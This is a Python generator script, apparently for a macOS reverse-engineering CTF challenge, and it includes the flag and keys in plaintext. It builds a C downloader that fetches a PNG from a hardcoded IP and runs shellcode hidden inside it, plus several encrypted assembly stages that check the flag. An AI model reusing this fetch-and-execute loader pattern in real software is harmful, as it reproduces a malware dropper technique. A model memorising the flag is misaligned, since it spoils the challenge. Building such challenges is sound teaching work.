# Generate
import ctypes
from ctypes import *
import sys
import struct
import subprocess
import os
import time
import codecs
import argparse
import random
from shutil import copyfile
try:
    from macholib.MachO import MachO
except ImportError:
    print('macholib module not installed.')
    sys.exit()
try:
    libc = CDLL("/usr/lib/libc.dylib")
except ImportError:
    print('requires libc.dylib')
    sys.exit()
# ----------------------------------
# CONFIGURATION OPTIONS
# ----------------------------------
FLAG                 = b"Y0_daWg_1_h34rd_u_1ik3_fl4gs" # MUST BE 28 BYTES
SEED                 = random.randint(1, 0x1fcd1d2076ca6573)
RC4_KEY              = "YrQmwT96" # KEY MUST BE 8 BYTES
XOR_KEY              = "LJcbuOQJ" # KEY MUST BE 8 BYTES
CIPHER_KEY           = "r00t" # KEY MUST BE 4 BYTES
ROT13_KEY            = '4MoreLevels2GoKeepGoing'

RC4_ASSEMBLY_FILE    = "gen_rc4.asm"
XOR_ASSEMBLY_FILE    = "gen_xor.asm"
CIPHER_ASSEMBLY_FILE = 'gen_cipher.asm'
ROT13_ASSEMBLY_FILE  = 'gen_rot13.asm'
DOWNLOADER_FILE      = 'downloader'

RC4_PRINT            = 'Almost there, this is the home stretch!\n'
XOR_PRINT            = "Keep going!"
CIPHER_PRINT         = "Keep going!"
ROT13_PRINT          = "I believe in you ..."

CODE_PNG_OFFSET      = 0x60000 # MUST BE SMALLER THAN IMAGE
CODE_PNG_OFFSET_2    = 0x7878 # 0x60000 + 0x7878
HOSTNAME             = "157.230.132.171"
PNG_FILE             = "pickachu.png"
PNG_NAME             = "pickachu_wut.png"
FAIL_WHALE = [
    32,32,32,32,32,70,65,73,76,32,87,72,65,76,69,33,10,10,87,32,32,32,32,32,
    87,32,32,32,32,32,32,87,32,32,32,32,32,32,32,32,10,87,32,32,32,32,32,32,
    32,32,87,32,32,87,32,32,32,32,32,87,32,32,32,32,10,32,32,32,32,32,32,32,
    32,32,32,32,32,32,32,39,46,32,32,87,32,32,32,32,32,32,10,32,32,46,45,34,
    34,45,46,95,32,32,32,32,32,92,32,92,46,45,45,124,32,32,10,32,47,32,32,32,
    32,32,32,32,34,45,46,46,95,95,41,32,46,45,39,32,32,32,10,124,32,32,32,32,
    32,95,32,32,32,32,32,32,32,32,32,47,32,32,32,32,32,32,10,92,39,45,46,95,
    95,44,32,32,32,46,95,95,46,44,39,32,32,32,32,32,32,32,10,32,96,39,45,45,
    45,45,39,46,95,92,45,45,39,32,32,32,32,32,32,10,86,86,86,86,86,86,86,86,
    86,86,86,86,86,86,86,86,86,86,86,86,86,10]

# ----------------------------------
# END CONFIGURATION OPTIONS
# ----------------------------------
DIST_DIR             = "dist"
SRC_DIR              = "src"
FLAG_INTEGER         = 0 # DEFAULT
VERIFYA = 0
VERIFYB = 0
VERIFYC = 0

def generate_downloader(filename):
    final_flag = "fb{"+"A" * len(FLAG) + "}"
    formatted_downloader = \
    """
    /*
    *  THIS IS AN AUTOGENERATED FILE
    *  gcc downloader.c -o downloader -fno-stack-protector -fno-builtin
    */
    #include <arpa/inet.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/socket.h>
    #include <unistd.h>
    #include <sys/mman.h>

    #include <libkern/OSByteOrder.h>
    #define bswap_64(x) OSSwapInt64(x)

    #define MAX_REQUEST_LEN   1024
    #define MAX_MMAP_SIZE     0x80000
    #define CODE_PNG_OFFSET   %s
    #define GET_REQUEST       "GET /%s HTTP/1.1\\r\\nHost: %%s\\r\\n\\r\\n"
    #define IP_ADDRESS        "%s"
    #define FLAG              "%s"
    #define FINAL_FLAG_LEN    %d
    #define SERVER_PORT       80
    #define FLAG_SIZE         %d
    #define FLAG_TEXT         "Enter the actual flag: \\n"
    #define SHELLCODE_SIZE    0x4096
    #define SEED              %s
    #define VERIFY_INTA       %s
    #define VERIFY_INTB       %s
    #define VERIFY_INTC       %s

    int send_request(int * psocket)
    {
      char request[MAX_REQUEST_LEN];
      int request_len, ret;
      in_addr_t in_addr;
      ssize_t nbytes_total, nbytes_last;
      struct sockaddr_in sockaddr_in;
      request_len = snprintf(
        request,
        MAX_REQUEST_LEN,
        GET_REQUEST,
        IP_ADDRESS
      );
      if (request_len >= MAX_REQUEST_LEN)
        exit(EXIT_FAILURE);
      *psocket = socket(
        AF_INET,
        SOCK_STREAM,
        IPPROTO_TCP
      );
      if (*psocket == -1)
        exit(EXIT_FAILURE);
      inet_aton(
        IP_ADDRESS,
        (struct in_addr *)&sockaddr_in.sin_addr.s_addr
      );
      sockaddr_in.sin_family = AF_INET;
      sockaddr_in.sin_port = htons(SERVER_PORT);
      ret = connect(
        *psocket,
        (struct sockaddr*)&sockaddr_in,
        sizeof(sockaddr_in)
      );
      if ( ret == -1)
        exit(EXIT_FAILURE);
      /* Send HTTP request. */
      nbytes_total = 0;
      while (nbytes_total < request_len)
      {
          nbytes_last = write(
            *psocket,
            request + nbytes_total,
            request_len - nbytes_total
          );
          if (nbytes_last == -1)
          {
              exit(EXIT_FAILURE);
          }
          nbytes_total += nbytes_last;
      }
      return request_len;
    }

    int receive_response(int * psocket, void ** dst)
    {
      char request_buffer[BUFSIZ];
      ssize_t nbytes_total, nbytes_last;
      void * cursor;
      *dst = mmap(
        NULL,
        MAX_MMAP_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_ANON|MAP_PRIVATE,
        -1,0
      );
      if (dst == MAP_FAILED)
        exit(EXIT_FAILURE);
      cursor = *dst;
      /* Read the response. */
      while ((nbytes_total = read(*psocket, request_buffer, BUFSIZ)) > 0) {
        memcpy(cursor, request_buffer, nbytes_total);
        cursor = cursor + nbytes_total;
      }
      if (nbytes_total == -1)
        exit(EXIT_FAILURE);
      return nbytes_total;
    }

    /* Look for PNG magic number */
    int check_png_header(void * response_data)
    {
      uint64_t count = 0;
      uint64_t png_offset;
      for (int i = 0; i < MAX_MMAP_SIZE; i++)
      {
        // PNG. header
        if ( 0x89 == ((uint8_t *)response_data)[i]  && \\
             0x50 == ((uint8_t *)response_data)[i+1]&& \\
             0x4E == ((uint8_t *)response_data)[i+2]&& \\
             0x47 == ((uint8_t *)response_data)[i+3])
        {
          count = CODE_PNG_OFFSET + i;
          break;
        }
      }
      png_offset = count;
      return png_offset;
    }

    int main(int argc, char** argv)
    {
        int psocket;
        void * response_data = NULL;
        void * shellcode1 = NULL;
        void * shellcode2 = NULL;
        int ret = 0;
        uint64_t flag_integer, png_offset, png_offset2, A, B, C;
        uint32_t D;
        uint64_t VERIFY, VERIFYA, VERIFYB, VERIFYC, VERIFYD;
        unsigned char flag_text[] = FLAG_TEXT;
        unsigned char final_flag[FINAL_FLAG_LEN+1] = FLAG;
        unsigned char key[FLAG_SIZE+2];

        send_request(&psocket);
        receive_response(&psocket, &response_data);
        close(psocket);

        png_offset = check_png_header(response_data);
        if (png_offset == 0)
          exit(EXIT_FAILURE);
        /* prepare rot13 shellcode */
        shellcode1 = mmap(
          NULL,
          SHELLCODE_SIZE,
          PROT_READ|PROT_WRITE|PROT_EXEC,
          MAP_ANON|MAP_PRIVATE,
          -1,0);
        memcpy(shellcode1, (response_data+png_offset), SHELLCODE_SIZE);
        uint64_t(*sc1)(uint64_t) = (uint64_t(*)(uint64_t))shellcode1;
        png_offset2 = sc1(0);
        munmap(shellcode1, SHELLCODE_SIZE);
        /* prepare cipher shellcode */
        shellcode2 = mmap(
          NULL,
          SHELLCODE_SIZE,
          PROT_READ|PROT_WRITE|PROT_EXEC,
          MAP_ANON|MAP_PRIVATE,
          -1,0);
        memcpy(
          shellcode2,
          (response_data+png_offset+png_offset2),
          SHELLCODE_SIZE);
        uint64_t(*sc2)(uint64_t) = (uint64_t(*)(uint64_t))shellcode2;
        flag_integer = sc2(0);
        munmap(shellcode2, SHELLCODE_SIZE);
        munmap(response_data, MAX_MMAP_SIZE);
        VERIFY = bswap_64(flag_integer);

        __asm__(
          "movq $0x2000004, %%%%rax \\n\\t"
          "movq $1, %%%%rdi \\n\\t"
          "movq %%1, %%%%rsi \\n\\t"
          "movl $24, %%%%edx \\n\\t"
          "syscall \\n\\t"
          : "=g"(ret)
          : "g"(&flag_text));

        __asm__(
          "movq $0x2000003, %%%%rax \\n\\t"
          "movq $0, %%%%rdi \\n\\t"
          "movq %%1, %%%%rsi \\n\\t"
          "movl $30, %%%%edx \\n\\t"
          "syscall \\n\\t"
          : "=g"(ret)
          : "g"(&key));

        for (int i= 7; i >= 0; i--)
          A = A << 8 | (uint64_t)key[i];
        for (int i= 15; i >= 8; i--)
          B = (B << 8) | (uint64_t)key[i];
        for (int i= 23; i >= 16; i--)
          C = (C << 8) | (uint64_t)key[i];
        for (int i= 27; i >= 24; i--)
          D = (D << 8) | (uint32_t)key[i];

        VERIFYA = A ^ B;
        VERIFYB = B ^ C;
        VERIFYC = C ^ D;
        VERIFYD = D ^ SEED;

        if (VERIFY_INTA == VERIFYA && \\
            VERIFY_INTB == VERIFYB && \\
            VERIFY_INTC == VERIFYC && \\
            VERIFYD == VERIFY)
        {
          for (int i= 3, j= 0; i < FINAL_FLAG_LEN-1; i++, j++)
          {
            final_flag[i] = key[j];
          }
          final_flag[FINAL_FLAG_LEN] = '\\n';
          printf("\\n%%s\\n", final_flag);
          printf("\\nCongratulations!!\\n");
          printf("Created by @malwareunicorn\\n");
        }
        else
        {
          printf("\\nDOH!! try harder :( \\n");
        }

        exit(EXIT_SUCCESS);
    }
    """
    formatted_downloader = formatted_downloader % (
        hex(CODE_PNG_OFFSET).rstrip("L"),
        PNG_NAME,
        HOSTNAME,
        final_flag,
        len(final_flag),
        len(FLAG),
        hex(SEED).rstrip("L"),
        hex(VERIFYA).rstrip("L"),
        hex(VERIFYB).rstrip("L"),
        hex(VERIFYC).rstrip("L"))
    with open(os.path.join(SRC_DIR,"gen_%s.c" % filename), 'wb') as f:
        f.write(formatted_downloader)
        f.close()
    return

def generate_rot13_assembly(encrypted, filename):
    pkey = create_string_buffer(ROT13_KEY)
    pkeyint = cast(pkey, POINTER(c_ushort))
    pkeyint = pkeyint[0] ^ CODE_PNG_OFFSET_2
    keybytes = hex(pkeyint).rstrip("L")
    formatted_rot13_assembly = \
    """; THIS IS AN AUTOGENERATED FILE
    ; WARNING: FOR MACOS ONLY
    ; nasm -f macho64 rot13.asm -o rot13.o && ld -o rot13.macho -macosx_version_min 10.7 -e start rot13.o && ./rot13.macho

    BITS 64

    section .text
    global start

    start:
      push   rbp
      mov    rbp,rsp

    ; PRINT OUTPUT
      push   0xa203a
      mov    DWORD [rsp+0x4],0x0
      push   0x76207965
      mov    DWORD [rsp+0x4],0x65756c61
      push   0x7475706e
      mov    DWORD [rsp+0x4],0x6b206120
      push   0x61656c50
      mov    DWORD [rsp+0x4],0x69206573
      mov    rax, 0x2000004
      mov    rdi, 0x1
      mov    rsi, rsp
      mov    edx, 0x1b
      syscall
      pop    rax
      pop    rax
      pop    rax
      pop    rax
      ; GET INPUT
      mov    rax, 0x2000003
      mov    rdi, 0
      lea    rsi, [rel key]
      mov    edx, %d
      syscall

    ; START DECRYPTION
      mov    r12, 0 ;              ; int i = 0;
      mov    r10w, WORD [rel key]
      lea    r14, [rel key]
    loop1:
      cmp    r12, %d              ; Length of Answer
      jge    verify_rot13
      movzx  ecx, BYTE [r14 + r12] ; c = Answer[i]
      cmp    ecx, 0x41             ; if c >='A'
      jl     goto_lowercase
      cmp    ecx, 0x5a             ; if c <='Z'
      jg     goto_lowercase
      add    ecx, 0xd              ; e = c + ROT
      cmp    ecx, 0x5a             ; if((e = c + ROT) <= 'Z')
      jg     greater_than
      mov    BYTE [r14 + r12], cl  ; Answer[i] = e;
      jmp    goto_increment1
    greater_than:
      movzx  ecx, BYTE [r14 + r12]
      sub    ecx, 0xd              ; e = c - ROT
      mov    BYTE [r14 + r12], cl  ; Answer[i] = e;
    goto_increment1:
      jmp    increment
    goto_lowercase:
      movzx  ecx, BYTE [r14 + r12] ; c = Answer[i]
      cmp    ecx, 0x61 ; 'a'       ; if c >='a'
      jl     neither
      cmp    ecx, 0x7a             ; if c <='z'
      jg     neither
      mov    eax, ecx
      add    eax, 0xd              ; e = c + ROT
      cmp    eax, 0x7a             ; if((e= c + ROT) <= 'z')
      jg     greater_than2
      mov    cl, al
      mov    BYTE [r14+r12], cl    ; Answer[i] = e;
      jmp    goto_increment2
    greater_than2:
      movzx  ecx, BYTE [r14 + r12]
      sub    ecx, 0xd              ; e = c - ROT
      mov    BYTE [r14 + r12], cl  ; Answer[i] = e;
    goto_increment2:
      jmp    increment
    neither:                       ; else
      movzx  ecx, BYTE [r14 + r12] ; c
      mov    BYTE [r14 + r12], cl  ; Answer[i] = c;
    increment:
      inc    r12
      jmp    loop1

    verify_rot13:
      xor    r8, r8                ; int isSame = 0;
      xor    r12, r12              ; int i = 0
      lea    r13, [rel ROT13]
    loop2:
      cmp    r12, %d               ; i < 23
      jge    exit_loop
      movzx  ecx, BYTE [r14 + r12] ; Answer[i]
      movzx  edx, BYTE [r13 + r12] ; final[i]
      cmp    ecx, edx              ; if (final[i] == Answer[i])
      jne    not_equal
      mov    r8, 0x1               ; isSame = 1
      jmp    continue_loop
    not_equal:
      mov    r8, 0x0               ; isSame = 0
      jmp    exit_loop             ; break;
    continue_loop:
      inc    r12
      jmp    loop2
    exit_loop:
      cmp    r8d, 0x1              ; if (isSame == 1)
      jne    fail
      mov    eax, 0x2000004        ; write
      mov    rdi, 1                ; std out
      lea    rsi, [rel msg]
      mov    edx, %d
      syscall
      xor    eax, eax
      mov    ax, %s                ; 0x4d34 ^ 0x354C = 0x7878 (offset of next shellcode)
      xor    ax, r10w
      pop    rbp
      retn
    fail:
      mov    rax, 0x2000004        ; write
      mov    rdi, 1                ; std out
      lea    rsi, [rel msg2]
      mov    edx, %d
      syscall
      xor    eax, eax
      mov    rax, 0x2000001 ; exit
      mov    rdi, 0
      syscall

    section .data
    ROT13: db "%s", 10
    key: times %d db 0
    msg: db "%s", 10
    msg2:
      db %s

    """
    formatted_rot13_assembly = formatted_rot13_assembly % (
        len(encrypted)+4, # size of encrypted +4
        len(encrypted), # size of encrypted
        len(encrypted), # size of encrypted
        len(ROT13_PRINT)+1,
        keybytes,
        len(FAIL_WHALE), # fail size
        encrypted,
        len(encrypted)+4, # size of encrypted +4
        ROT13_PRINT,
        ",".join(map(str, FAIL_WHALE))) # fail whale
    with open(os.path.join(SRC_DIR,filename), 'wb') as f:
        f.write(formatted_rot13_assembly)
        f.close()

def generate_cipher_assembly(encrypted, filename):
    formatted_cipher_assembly = \
    """; THIS IS AN AUTOGENERATED FILE
    ; WARNING: FOR MACOS ONLY
    ; nasm -f macho64 cipher.asm -o cipher.o && ld -o cipher.macho -macosx_version_min 10.7 -e start cipher.o && ./cipher.macho

    BITS 64

    section .text
    global start

    start:
      push   rbp
      mov    rbp,rsp

      ; PRINT OUTPUT
      push   0xa203a
      mov    DWORD [rsp+0x4],0x0
      push   0x76207965
      mov    DWORD [rsp+0x4],0x65756c61
      push   0x7475706e
      mov    DWORD [rsp+0x4],0x6b206120
      push   0x61656c50
      mov    DWORD [rsp+0x4],0x69206573
      mov    rax, 0x2000004
      mov    rdi, 0x1
      mov    rsi, rsp
      mov    edx, 0x1b
      syscall
      pop    rax
      pop    rax
      pop    rax
      pop    rax
      ; GET INPUT
      mov    rax, 0x2000003
      mov    rdi, 0
      lea    rsi, [rel key]
      mov    edx, 0x10
      syscall

    ; GENERATE KEY
      mov    r9, 0                ; int i = 0;
      mov    r10, 0               ; int j = 0;
      lea    r13, [rel encrypted]
      lea    r14, [rel key]
      lea    r15, [rel keyframe]
    loop1:
      cmp    r9, %d               ; Length of encrypted
      jge    decrypt
      cmp    r10, 4               ; if(j == keyLen)
      jne    not_length
      xor    r10, r10             ; j = 0
      not_length:
      movzx  ecx, BYTE [r14+r10]  ; c = key[j]
      mov    BYTE [r15 + r9], cl  ; newKey[i] = c
      inc    r9                   ; i++
      inc    r10                  ; j++
      jmp    loop1

    decrypt:
      xor    r9, r9               ; int i = 0;
    loop2:
      cmp    r9, %d               ; Length of encrypted
      jge    exitloop
      movzx  ecx, BYTE [r13+r9]   ; a = encrypted[i]
      movzx  edx, BYTE [r15+r9]   ; b = keyframe[i]
      sub    ecx, edx             ; a - b
      add    ecx, 256             ; a + 256
      mov    rdx, 0
      mov    eax, ecx
      cdq
      mov    esi, 256
      idiv   esi
      mov    BYTE [r13 + r9], dl  ; decryptedMsg[i] = a
      inc    r9                   ; i++
      jmp    loop2

    exitloop:
      mov    edx, DWORD [r13]
      cmp    edx, 0xE5894855
      jne    fail
      mov    eax, 0x2000004 ; write
      mov    rdi, 1         ; std out
      lea    rsi, [rel msg]
      mov    edx, %d
      syscall
      xor    eax, eax
      call   r13
      jmp    final
    fail:
      mov    eax, 0x2000004 ; write
      mov    rdi, 1         ; std out
      lea    rsi, [rel msg2]
      mov    edx, %d
      syscall
      xor    eax, eax
      mov    rax, 0x2000001 ; exit
      mov    rdi, 0
      syscall
    final:
      pop    rbp
      retn

    section .data
      encrypted:
        db %s
      key: times 0x10 db 0
      keyframe: times %d db 0
      msg:
        db "%s", 10
      msg2:
        db %s
    """
    formatted_cipher_assembly = formatted_cipher_assembly % (
        len(encrypted), # size of encrypted
        len(encrypted), # size of encrypted
        len(CIPHER_PRINT)+1,
        len(FAIL_WHALE), # fail size
        ",".join(map(str, encrypted)), # encrypted
        len(encrypted),
        CIPHER_PRINT,
        ",".join(map(str, FAIL_WHALE))) # fail whale
    with open(os.path.join(SRC_DIR,filename), 'wb') as f:
        f.write(formatted_cipher_assembly)
        f.close()

def generate_xor_assembly(encrypted, filename):
    pkey = create_string_buffer(XOR_KEY)
    pkeyint = cast(byref(pkey, 4), POINTER(c_uint))
    keybytes = hex(pkeyint[0]).rstrip("L")
    formatted_xor_assembly = \
    """; THIS IS AN AUTOGENERATED FILE
    ; WARNING: FOR MACOS ONLY
    ; nasm -f macho64 pxor.asm -o pxor.o && ld -o pxor.macho -macosx_version_min 10.7 -e start pxor.o && ./pxor.macho

    BITS 64

    section .text
    global start

    start:
      push   rbp
      mov    rbp, rsp

      ; PRINT OUTPUT
      push   0xa203a
      mov    DWORD [rsp+0x4],0x0
      push   0x76207965
      mov    DWORD [rsp+0x4],0x65756c61
      push   0x7475706e
      mov    DWORD [rsp+0x4],0x6b206120
      push   0x61656c50
      mov    DWORD [rsp+0x4],0x69206573
      mov    rax, 0x2000004
      mov    rdi, 0x1
      mov    rsi, rsp
      mov    edx, 0x1b
      syscall
      pop    rax
      pop    rax
      pop    rax
      pop    rax
      ; GET INPUT
      mov    rax, 0x2000003
      mov    rdi, 0
      lea    rsi, [rel key]
      mov    edx, 0x10
      syscall

      ; CHECK 4 BYTES OF KEY
      xor    rdx, rdx
      mov    rdx, QWORD [rel key]
      shr    rdx, 32
      cmp    edx, %s
      jne    fail

      lea    r15, [rel encrypted]
      lea    r14, [rel key]
      mov    r12, 0 ; i
    loop1:
      cmp    r12, %d
      jge    exitloop
      mov    eax, 8
      mov    rcx, r12  ;j = i
      mov    r10, rcx  ; store i
      movzx  edx, BYTE [r15+rcx] ; encrypted[i]
      mov    r11d, eax ; store 8
      mov    eax, r10d ; i
      mov    r9d, edx ; encrypted[i]
      cdq
      mov    esi, r11d ; 8
      idiv   esi
      movsxd rcx, edx
      movzx  edx, BYTE [r14+rcx]
      mov    edi, r9d ; encrypted[i]
      xor    edi, edx
      mov    r8b, dil ; product
      mov    rcx, r12
      mov    [r15+rcx], r8b ; encrypted[i] = product
      inc    r12 ; i++
      jmp    loop1
    exitloop:
      mov    edx, DWORD [r15]
      cmp    edx, 0xE5894855
      jne    fail
      mov    eax, 0x2000004 ; write
      mov    rdi, 1         ; std out
      lea    rsi, [rel msg]
      mov    edx, %d
      syscall
      xor    eax, eax
      call   r15
      jmp    final
    fail:
      mov    eax, 0x2000004 ; write
      mov    rdi, 1         ; std out
      lea    rsi, [rel msg2]
      mov    edx, %d
      syscall
      xor    eax, eax
      mov    rax, 0x2000001 ; exit
      mov    rdi, 0
      syscall
    final:
      pop    rbp
      retn

    section .data
      encrypted:
            db %s
          key: times 0x10 db 0
          msg:
            db "%s", 10
          msg2:
            db %s
        """
    formatted_xor_assembly = formatted_xor_assembly % (
        keybytes,  # hex code
        len(encrypted), # size of encrypted
        len(XOR_PRINT)+1,
        len(FAIL_WHALE), # fail size
        ",".join(map(str, encrypted)), # encrypted
        XOR_PRINT,
        ",".join(map(str, FAIL_WHALE))) # fail whale
    with open(os.path.join(SRC_DIR,filename), 'wb') as f:
        f.write(formatted_xor_assembly)
        f.close()

def generate_rc4_assembly(encrypted, filename):
    pkey = create_string_buffer(RC4_KEY)
    pkeyint = cast(byref(pkey, 4), POINTER(c_uint))
    keybytes = hex(pkeyint[0]).rstrip("L")
    formatted_assembly = \
    """; THIS IS AN AUTOGENERATED FILE
    ; WARNING: FOR MACOS ONLY
    ; nasm -f macho64 gen_rc4.asm -o gen_rc4.o && ld -o gen_rc4.macho -macosx_version_min 10.7 -e start gen_rc4.o && ./gen_rc4.macho

    BITS 64

    section .text
    global start

    start:
      push   rbp
      mov    rbp, rsp

      ; PRINT OUTPUT
      push   0xa203a
      mov    DWORD [rsp+0x4],0x0
      push   0x76207965
      mov    DWORD [rsp+0x4],0x65756c61
      push   0x7475706e
      mov    DWORD [rsp+0x4],0x6b206120
      push   0x61656c50
      mov    DWORD [rsp+0x4],0x69206573
      mov    rax,0x2000004
      mov    rdi,0x1
      mov    rsi,rsp
      mov    edx,0x1b
      syscall
      pop rax
      pop rax
      pop rax
      pop rax

      ; GET INPUT
      mov rax, 0x2000003
      mov rdi, 0
      lea rsi, [rel key]
      mov edx, 0x10
      syscall

      ; CHECK 4 BYTES OF KEY
      mov     rdx, QWORD [rel key]
      shr     rdx, 32
      cmp     edx, %s
      jne     fail

      ; GENERATE SBOX
      lea rcx, [rel key]               ; key: rcx
      mov rdx, strict qword 8          ; L: rdx
      lea r8, [rel sbox]               ; sbox: r8
      call rc4init

      lea rcx, [rel encrypted]          ; bufin
      mov rdx, strict qword %d          ; len
      lea r8, [rel encrypted]           ; bufout
      lea r9, [rel sbox]                ; sbox
      call rc4run
      mov eax, 0x2000004 ; write
      mov rdi, 1         ; std out
      lea rsi, [rel encrypted]
      add rsi, 8
      mov edx, %d
      syscall
      mov rax, qword [rel encrypted]
      xor rbx, rbx
      xor rcx, rcx
      xor rdx, rdx
      xor rdi, rdi
      pop rbp
      ret
    ; PRINT FAIL WHALE
    fail:
      mov     eax, 0x2000004 ; write
      mov     rdi, 1         ; std out
      lea     rsi, [rel msg2]
      mov     edx, %d
      syscall
      xor     eax, eax
      mov     rax, 0x2000001 ; exit
      mov     rdi, 0
      syscall

    rc4init:
      push   rbp
      mov    rbp, rsp
      xor    rax, rax
      mov    r11, 0x20
      mov    r9, 0x808080808080808
      mov    r10, 0x706050403020100
    loop1_s:
      cmp    rax,r11
      je     loop1_e
      mov    QWORD [r8+rax*8], r10
      add    r10, r9
      inc    rax
      jmp    loop1_s
    loop1_e:
      xor    rax,rax
      xor    r9,r9
      xor    r10,r10
    loop2_s:
      movzx  r11, BYTE [r8+rax*1]
      add    r9, r11
      movq   xmm0,r11
      movzx  r11,BYTE [rcx+r10*1]
      add    r9, r11
      xor    r11, r11
      mov    r11b, r9b
      xchg   r9, r11
      movzx  r11, BYTE [r8+r9*1]
      mov    BYTE [r8+rax*1], r11b
      movq   r11, xmm0
      mov    BYTE [r8+r9*1], r11b
      inc    r10
      xor    r11, r11
      cmp    rdx, r10
      cmove  r10, r11
      inc    rax
      test   al, al
      jne    loop2_s
      pop    rbp
      ret

    rc4run:
      push   rbp
      mov    rbp, rsp
      xor    rax, rax
      xor    r10, r10
      movq   xmm0, r10
      movq   xmm1, r10
    rc4run_loop1_s:
      cmp    rdx, rax
      je     rc4run_loop1_e
      movq   r10, xmm0
      inc    r10
      xor    r11, r11
      mov    r11b, r10b
      movq   xmm0, r11
      movzx  r10, BYTE [r9+r11*1]
      movq   r11, xmm1
      movq   xmm2, r10
      add    r10, r11
      xor    r11, r11
      mov    r11b, r10b
      movq   xmm1, r11
      movzx  r10, BYTE [r9+r11*1]
      movq   xmm3, r10
      movq   r11, xmm0
      mov    BYTE [r9+r11*1], r10b
      movq   r11, xmm1
      movq   r10, xmm2
      mov    BYTE [r9+r11*1], r10b
      movq   r11, xmm3
      add    r10, r11
      xor    r11, r11
      mov    r11b, r10b
      movzx  r10, BYTE [r9+r11*1]
      movzx  r11, BYTE [rcx+rax*1]
      xor    r10, r11
      mov    BYTE [r8+rax*1],r10b
      inc    rax
      jmp    rc4run_loop1_s
    rc4run_loop1_e:
      pop rbp
      ret

    section .data
      encrypted:
        db %s
      key: times 0x10 db 0
      sbox: times 0x100 db 0
      msg2:
        db %s
    """
    formatted_assembly = formatted_assembly % (
        keybytes,  # hex code
        len(encrypted), # size of encrypted
        len(encrypted)-8, # size - 8
        len(FAIL_WHALE), # fail size
        ",".join(map(str, encrypted)), # encrypted
        ",".join(map(str, FAIL_WHALE))) # fail whale

    #print(formatted_assembly)
    with open(os.path.join(SRC_DIR,filename), 'wb') as f:
        f.write(formatted_assembly)
        f.close()

def generate_macho(filename):
    # compile mach-o with nasm
    while not os.path.exists(os.path.join(SRC_DIR, filename)):
        time.sleep(1)
    b = os.path.splitext(filename)[0]
    cmd = "nasm -f macho64 %s/%s.asm -o %s/%s.o &&\
        ld -o %s/%s.macho -macosx_version_min 10.7 -e start %s/%s.o" % (
            SRC_DIR,b,SRC_DIR,b,SRC_DIR,b,SRC_DIR,b)
    return subprocess.call(cmd, shell=True)

def generate_downloader_macho(filename):
    # compile mach-o
    cmd = "gcc %s/gen_%s.c -o %s/%s.macho -fno-stack-protector -fno-builtin" % (
            SRC_DIR,filename,DIST_DIR,filename)
    return subprocess.call(cmd, shell=True)

def extract_shellcode(filename):
    # find offset of _text and _data and extract to bin file
    b = os.path.splitext(filename)[0]
    macho_filename = os.path.join(SRC_DIR,"%s.macho" % (b))
    fileoffset = 0
    shellcodesize = 0
    m = MachO(macho_filename)
    for (load_cmd, cmd, data) in m.headers[0].commands:
        if data:
            if hasattr(data[0], "sectname"):
                sectionName = getattr(data[0], 'sectname', '').rstrip('\0')
                if "text" in sectionName:
                    fileoffset=data[0].offset
                    shellcodesize+=data[0].size
                if "data" in sectionName:
                    shellcodesize+=data[0].size
    shellcode_filename = os.path.join(SRC_DIR,"%s_shellcode.bin" % (b))
    with open(macho_filename, 'rb') as f:
        f.seek(fileoffset, 1)
        shellcode_bytes = f.read(shellcodesize)
        with open(shellcode_filename, 'wb') as sf:
            sf.write(shellcode_bytes)
            sf.close()
        f.close()
    return shellcode_bytes

def swap64(i):
    # bswap
    return struct.unpack("<Q", struct.pack(">Q", i))[0]

def rc4_key_schedule(key):
    # create the rc4 key schedule
    keylength = len(key)
    S = range(256)
    j = 0
    for i in range(256):
        k = ord(key[i % keylength])
        j = (j + S[i] + k) % 256
        S[i], S[j] = S[j], S[i]  # swap
    return S, j

def rc4_encrypt(dst, src, key):
    # rc4 encrypt the src
    src_len = len(src)
    S, j = rc4_key_schedule(key)
    j = 0
    i = 0
    m = 0
    while (m < src_len):
        char = src[m]
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        # swap
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        dst[m] = chr(ord(char) ^ k)
        m+=1

def xor_encrypt(src, key):
    # stream xor encrypt
    i = 0
    for c in src:
        src[i]=ord(c)^ord(key[i % 8])
        i+=1

def cipher_encrypt(src, key):
    # vigenere cipher encrypt
    newkey = []
    # generating new key
    i = 0
    j = 0
    for c in src:
        if j == len(key):
            j = 0
        newkey.append(key[j])
        i+=1
        j+=1
    newkey.append('\0')
    # encryption
    i = 0
    for c in src:
        src[i] = ((ord(src[i]) + ord(newkey[i])) % 256)
        i+=1

def cipher_decrypt(src, key):
    # vigenere cipher decrypt
    newkey = []
    # generating new key
    i = 0
    j = 0
    for c in src:
        if j == len(key):
            j = 0
        newkey.append(key[j])
        i+=1
        j+=1
    newkey.append('\0')
    # encryption
    i = 0
    for c in src:
        src[i] = (((src[i] - ord(newkey[i])) + 256) % 256)
        i+=1

def ro13_encrypt(key):
    # rot13 encrypt
    return codecs.encode(key, 'rot_13')

def rmfile(filename):
    # removes nasm files based on basename
    b = os.path.splitext(filename)[0]
    if os.path.exists(os.path.join(SRC_DIR,"%s.asm" % (b))):
        os.remove(os.path.join(SRC_DIR,"%s.asm" % (b)))
    if os.path.exists(os.path.join(SRC_DIR,"%s.o" % (b))):
        os.remove(os.path.join(SRC_DIR,"%s.o" % (b)))
    if os.path.exists(os.path.join(SRC_DIR,"%s.macho" % (b))):
        os.remove(os.path.join(SRC_DIR,"%s.macho" % (b)))
    if os.path.exists(os.path.join(SRC_DIR,"%s_shellcode.bin" % (b))):
        os.remove(os.path.join(SRC_DIR,"%s_shellcode.bin" % (b)))

def main():
    parser = argparse.ArgumentParser(description='This script generates the final binary and png. \
    All source files are placed in src directory. \
    Final macho and png are placed in the dist directory. ')
    parser.add_argument('--build', '-b', dest='build', action='store_true',
        help='build the distributed binary and png')
    parser.add_argument('--clean', '-c', dest='clean', action='store_true',
        help='remove all generated files')
    args = parser.parse_args()

    if args.build and not args.clean:
        global VERIFYA
        global VERIFYB
        global VERIFYC
        global FLAG_INTEGER
        # ----------------------------------
        # Generate FLAG_INTEGER
        # ----------------------------------
        pflag = create_string_buffer(FLAG) # null terminated
        # split flag into uint64 numbers
        A = cast(pflag, POINTER(c_ulong))
        B = cast(byref(pflag, 8), POINTER(c_ulong))
        C = cast(byref(pflag, 16), POINTER(c_ulong))
        D = cast(byref(pflag, 24), POINTER(c_uint))

        FLAG_INTEGER = D[0] ^ SEED
        VERIFYC = C[0] ^ D[0]
